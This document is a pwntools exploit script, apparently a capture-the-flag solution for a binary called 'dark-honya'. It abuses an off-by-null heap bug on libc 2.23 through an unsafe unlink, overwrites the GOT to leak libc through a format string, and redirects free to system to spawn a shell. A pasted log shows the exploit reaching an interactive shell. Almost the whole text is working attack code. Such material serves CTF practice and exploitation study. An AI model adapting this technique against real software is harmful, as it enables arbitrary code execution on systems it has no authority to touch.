from pwn import *
context.arch = 'amd64'

free_got = 0x602018
printf_plt = 0x400680
'''
130 [15:46:02] vagrant@oracle(oracle) offbyone> python3 dark-honya.py ;
[*] '/lib/x86_64-linux-gnu/libc-2.23.so'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
[+] Starting local process './dark-honya': pid 4249
[*] LIBC:  0x7f2333194000
[*] Switching to interactive mode
$ ls
books        core        dark-honya.py  weapon.i64
car_market    dark-honya    libc-2.23.so   weapon_libc.so.6
car_market.i64    dark-honya.i64    weapon           weapon.py
$ 
[*] Interrupted
'''

def buy(name):
    p.sendlineafter(b'Checkout!', str(1))
    if len(name) != 0xf8:
        p.sendlineafter(b'book?', name)
    else:
        p.sendafter(b'book?', name)

def free(idx):
    p.sendlineafter(b'Checkout!', str(2))
    p.sendlineafter(b'return?', str(idx))

def write(idx, name):
    p.sendlineafter(b'Checkout!', str(3))
    sleep(0.01)
    p.sendline(str(idx))
    p.sendlineafter(b'book?', name)

libc = ELF('/lib/x86_64-linux-gnu/libc-2.23.so')
p = process('./dark-honya')

p.recvline()
p.recvline()
p.sendline("hello")


'''
It creates a default chunk of size 0xf8
5 chunks

0 --> 0x100  A
1 --> 0x100  B
2 --> 0x100  C
3 --> 0x100  For format string
4 --> 0x100  /bin/sh

'''
buy("A"*0xf6)
buy("B"*0xf6)
buy("C"*0xf6)
buy("%15$p")
buy("/bin/sh")


ptr = 0x6021a0

payload = p64(0)
payload += p64(0xf1)
payload += p64(ptr - 0x18)
payload += p64(ptr - 0x10)
payload += b"a"*0xd0
payload += p64(0xf0)
'''
Off by Null in the read_string function
This is on LIBC 2.23, odoing so, we perform an unlink exploit
by overwriting the PREV_INUSE bit of the chunk 2 

Deleting the first chunk first and then allocating again, we get same chunk
Then, we gave 0xf9 size of buffer and PREV_INUSE bit is overwritten of the Chunk B

Now, we free the chunk B and the unlinking of the chunk would result in 
ptr's 0th index overwriten with the value of itself
'''
free(0)
buy(payload)
free(1)

payload = p64(0)*3
payload += p64(0x6021a0)
payload += p64(free_got)

'''
Change the index 0 to the address of the ptr itself for later reuse
and index 1 with the value of free@got
'''
write(0, payload)

'''
We ovwerwrite it the free@got with the printf@plt so for
the format string bug for libc leak
'''
write(1, p64(printf_plt)*2)

p.sendlineafter("Checkout!", "2")
p.sendlineafter("?", "3")
libc.address = int(p.recvline().strip(), 16) - 0x20840
log.info("LIBC:  0x%x" %(libc.address))

'''
Overwrite the index 1, free@got again, this time with the system@libc
'''
payload = p64(libc.sym['system'])
payload += p64(printf_plt)
write(1, payload)


'''
Trigger the free("/bin/sh") ---> system("/bin/sh")
'''
free(4)
p.interactive()